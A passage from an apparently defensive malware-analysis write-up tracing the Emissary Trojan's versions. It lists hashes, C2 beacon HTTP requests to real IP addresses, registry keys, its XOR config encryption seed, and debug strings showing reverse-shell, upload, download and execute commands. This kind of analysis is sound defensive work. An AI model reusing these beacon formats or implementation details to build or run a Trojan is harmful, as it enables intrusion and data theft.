class="crayon-h"> </span><span class="crayon-i">op</span>=<span class="crayon-cn">1635b097</span>-<span class="crayon-i">ffe4</span>-<span class="crayon-cn">4711</span>-<span class="crayon-cn">89e6</span>-<span class="crayon-cn">7f8c7f4cdca6</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>Date: 5/31/2009</strong></p>
<p>SHA256: e6c4611b1399ada920730686395d6fc1700fc39add3d0d40b4f784ccb6ad0c30, Original Name: WUMsvc.dll</p>
<p>Removed checks for "//" and "/" in the update configuration command when updating the three C2 servers.</p>
<h4>Version 1.1</h4>
<p><strong>Date: 6/5/2009</strong></p>
<p>SHA256: 931a1284b11a3997c7a99076d582ed3436aa30409dc73bd763436dddd490f9cb</p>
<p>Original Name: WUMsvc.dll</p>
<p>Bug fixes:</p>
<ul>
<li>Added code to make sure the content received from the C2 server matches the "Content-Length" value in the HTTP response.</li>
<li>Code added to allow for the download of more than 524,288 bytes.</li>
</ul>
<p>The Emissary v1.1 C2 beacon appears as follows, which has not changed since version 1.0:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e22103195900" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /eng/comfunc/comfunc/default.aspx HTTP/1.1
User-Agent: Mozilla/4.0
Host: 137.189.145.1
Cookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e22103195900-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e22103195900-2">2</div><div class="crayon-num" data-line="crayon-671986a833e22103195900-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e22103195900-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e22103195900-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span>/<span class="crayon-i">eng</span>/<span class="crayon-i">comfunc</span>/<span class="crayon-i">comfunc</span>/<span class="crayon-st">default</span><span class="crayon-sy">.</span><span class="crayon-e">aspx </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e22103195900-2"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">4.0</span></div><div class="crayon-line" id="crayon-671986a833e22103195900-3"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">137.189.145.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e22103195900-4"><span class="crayon-i">Cookie</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">guid</span>=<span class="crayon-i">af44f802</span>-<span class="crayon-i">ba5c</span>-<span class="crayon-cn">4b3c</span>-<span class="crayon-cn">8c6b</span>-<span class="crayon-cn">2ea411058678</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">op</span>=<span class="crayon-cn">1635b097</span>-<span class="crayon-i">ffe4</span>-<span class="crayon-cn">4711</span>-<span class="crayon-cn">89e6</span>-<span class="crayon-cn">7f8c7f4cdca6</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p></p>
<h4>Version 2.0</h4>
<p><strong>Date: 9/15/2011</strong></p>
<p>SHA256: 5edf2d0270f8e7eb5be3476802e46c578c4afc4b046411be0806b9acc3bfa099 Original Name: EmissaryDll.dll</p>
<p>Version 2.0 was a significant re-write of the Emissary Trojan.</p>
<p>The configuration data for the Trojan is still saved to the registry, but the registry key has changed to:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e23741445727" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
SOFTWARE\Microsoft\VBA\VbaData</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e23741445727-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e23741445727-1"><span class="crayon-i">SOFTWARE</span><span class="crayon-sy">\</span><span class="crayon-i">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-i">VBA</span><span class="crayon-sy">\</span><span class="crayon-i">VbaData</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>The configuration structure also changed in size to 464 bytes. The Emissary configuration is now encrypted using a custom algorithm that uses the "srand" function to seed the "rand" function using a value of 2563. This seed value causes the "rand" function to generate the same values each time, which Emissary will use as a key along with the XOR operation. The configuration now contains the version number of Emissary, instead of the version being hardcoded into the Trojan.</p>
<p>This version of Emissary keeps track of which C2 location within its configuration that it has been communicating with by storing the index of the C2 server (1, 2, or 3) in the following registry key:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e24637359774" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
SOFTWARE\Microsoft\VBA\VbaList</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e24637359774-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e24637359774-1"><span class="crayon-i">SOFTWARE</span><span class="crayon-sy">\</span><span class="crayon-i">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-i">VBA</span><span class="crayon-sy">\</span><span class="crayon-i">VbaList</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
<p>This version of Emissary moves away from the command handler using the structure and moves to a nested if/else statement for less complicated command handling; however, the command GUID and commands themselves are unchanged.</p>
<p>The Emissary version 2.0 beacon changed slightly from previous versions, specifically the removal of the User-Agent field and the use of a lowercase "h" in the "Host" field. The following is an example of the version 2.0 beacon, which contains the same GUID and "op" values:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e25296748549" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /0test/test/default.aspx HTTP/1.1
host: 163.20.127.27
Cookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e25296748549-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e25296748549-2">2</div><div class="crayon-num" data-line="crayon-671986a833e25296748549-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e25296748549-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span>/<span class="crayon-cn">0test</span>/<span class="crayon-i">test</span>/<span class="crayon-st">default</span><span class="crayon-sy">.</span><span class="crayon-e">aspx </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e25296748549-2"><span class="crayon-i">host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">163.20.127.27</span></div><div class="crayon-line" id="crayon-671986a833e25296748549-3"><span class="crayon-i">Cookie</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">guid</span>=<span class="crayon-i">af44f802</span>-<span class="crayon-i">ba5c</span>-<span class="crayon-cn">4b3c</span>-<span class="crayon-cn">8c6b</span>-<span class="crayon-cn">2ea411058678</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">op</span>=<span class="crayon-cn">1635b097</span>-<span class="crayon-i">ffe4</span>-<span class="crayon-cn">4711</span>-<span class="crayon-cn">89e6</span>-<span class="crayon-cn">7f8c7f4cdca6</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>Version 2.0 also introduces a debug message logging system that includes verbose error messages that are accompanied by an error ID number. Error messages are written to the file %TEMP%\em.log. The following is a list of all possible debug messages:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e26624582781" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Source - Error ID - Debug Message
emissarydll.cpp - 0x30 - InitApp() - Event already exists
emissarydll.cpp - 0x35 - InitApp() - Event create successful
emissarydll.cpp - 0x3b - InitApp() - create work thread
shell.cpp - 0x30 - SendShellOutputThread - PeekNamedPipe - Error : 0x%08x
shell.cpp - 0x3e - SendShellOutputThread() : Timeout
shell.cpp - 0x53 - SendShellOutputThread - ReadFile - Error : 0x%08x
shell.cpp - 0x5b - SendShellOutputThread - send - Error : 0x%08x
shell.cpp - 0x62 - SendShellOutputThread() : thread exit
shell.cpp - 0x7f - RecvShellCmdThread - recv - Error : 0x%08x
shell.cpp - 0x89 - RecvShellCmdThread - WriteFile - Error : 0x%08x
shell.cpp - 0x8f - RecvShellCmdThread() : thread exit
shell.cpp - 0xeb - Error occured : %s [%d]
shell.cpp - 0xfa - TerminateThread Input Thread
shell.cpp - 0x100 - TerminateThread Output Thread
shell.cpp - 0x118 - SocketShell - Fail To Create Reverse Socket
shell.cpp - 0x12f - SocketShell - Fail To  Generate Reverse Shell
shell.cpp - 0x13a - SocketShell - SocketShell - Fail To  Generate Reverse Shell
shell.cpp - 0x13e - SocketShell - Create Reverse Shell Thread OK
config.cpp - 0x38 - RegCreateKeyEx error : %0x08x
config.cpp - 0x46 - RegSetValueEx error : %0x08x
config.cpp - 0x5e - ReadConfig - RegCreateKeyEx error : 0x%08x
config.cpp - 0x66 - ReadConfig - RegQueryValueEx error : 0x%08x
config.cpp - 0xab - find user: %s
config.cpp - 0xbc - can not find proxy
config.cpp - 0xc7 - get ProxySetting failed
config.cpp - 0xd4 - find proxy server : %s
run.cpp -      0x75 - InitConfig: [g_ServerPath:%s] [g_ServerName:%s] [g_port:%d] [g_ServerUrl:%s]
run.cpp - 0x9d - InitConfig: [g_DelayTime:%d]
run.cpp - 0xbe - get proxy the last time used:%s
run.cpp - 0xc3 - server index:%d
run.cpp - 0xd9 - RetryTimes = %d
run.cpp - 0xec - connect %s error :%s
run.cpp - 0x10c - process a request ok.
httpclient.cpp - 0x98 - ASP.NET_SessionId长度异常:[%d][%s] (translation: ASP.NET_SessionId Length Exception:[%d][%s])
httpclient.cpp - 0xd0 - ******not connected !
httpclient.cpp - 0xf4 - read hread error : %s
httpclient.cpp - 0x102 - body length = 0
httpclient.cpp - 0x13d - decrypt error"
httpclient.cpp - 0x211 - instruction : &lt;instruction&gt;
httpclient.cpp - 0x21d - no instruction guid
httpclient.cpp - 0x22c - OP_DOWNLOAD no local file name
httpclient.cpp - 0x23b - OP_UPLoad no local file name
httpclient.cpp - 0x249 - OP_UPLoad no local file name
httpclient.cpp - 0x242 - OP_UPLoad no local file name
httpclient.cpp - 0x25b - OP_EXECUTE no cmd list
httpclient.cpp - 0x262 - OP_EXECUTE no timeout
httpclient.cpp - 0x2b4 - OP_SHELL ip
httpclient.cpp - 0x2bb - OP_SHELL port
httpclient.cpp - 0x2dd - OP_CHANGECONFIG server1
httpclient.cpp - 0x2e4 - OP_CHANGECONFIG server2
httpclient.cpp - 0x2eb - OP_CHANGECONFIG server3
httpclient.cpp - 0x2f2 - OP_CHANGECONFIG timestr
httpclient.cpp - 0x2f9 - OP_CHANGECONFIG namestr
httpclient.cpp - 0x300 - OP_CHANGECONFIG guid
httpclient.cpp - 0x321 - not connected
httpclient.cpp - 0x361 - send msg error
httpdoinstruction.cpp - 0x28 - DownloadFile - LocalFileName=%s
httpdoinstruction.cpp - 0x5c - download file http head:%s
httpdoinstruction.cpp - 0x7a - download file ok
httpdoinstruction.cpp - 0xac - UploadFile - LocalFileName=%s
httpdoinstruction.cpp - 0xb4 - DownloadFile - Error - Open File [%S][0x%08x]
httpdoinstruction.cpp - 0xc7 - UploadFile:TotalLength=%d
httpdoinstruction.cpp - 0x124 - download file http head:%s</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e26624582781-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-2">2</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-4">4</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-6">6</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-8">8</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-10">10</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-12">12</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-14">14</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-16">16</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-18">18</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-20">20</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-22">22</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-24">24</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-26">26</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-28">28</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-30">30</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-32">32</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-34">34</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-36">36</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-38">38</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-40">40</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-42">42</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-44">44</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-46">46</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-48">48</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-50">50</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-52">52</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-54">54</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-56">56</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-58">58</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-60">60</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-62">62</div><div class="crayon-num" data-line="crayon-671986a833e26624582781-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e26624582781-64">64</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e26624582781-1"><span class="crayon-i">Source</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">Error </span><span class="crayon-i">ID</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">Debug </span><span class="crayon-e">Message</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-2"><span class="crayon-i">emissarydll</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x30</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">InitApp</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">Event </span><span class="crayon-e">already </span><span class="crayon-e">exists</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-3"><span class="crayon-i">emissarydll</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x35</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">InitApp</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">Event </span><span class="crayon-e">create </span><span class="crayon-e">successful</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-4"><span class="crayon-i">emissarydll</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x3b</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">InitApp</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">create </span><span class="crayon-e">work </span><span class="crayon-e">thread</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-5"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x30</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">SendShellOutputThread</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">PeekNamedPipe</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">Error</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x</span><span class="crayon-sy">%</span><span class="crayon-cn">08x</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-6"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x3e</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">SendShellOutputThread</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-e">Timeout</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-7"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x53</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">SendShellOutputThread</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">ReadFile</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">Error</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x</span><span class="crayon-sy">%</span><span class="crayon-cn">08x</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-8"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x5b</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">SendShellOutputThread</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">send</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">Error</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x</span><span class="crayon-sy">%</span><span class="crayon-cn">08x</span></div><div class="crayon-line" id="crayon-671986a833e26624582781-9"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-cn">0x62</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">SendShellOutputThread</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-e">thread </span><span class="crayon-e">exit</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e26624582781-10"><span class="crayon-i">shell</span><span class="crayon-sy">.</span><span class="crayon-i">cpp</span><span class="crayon-h"> 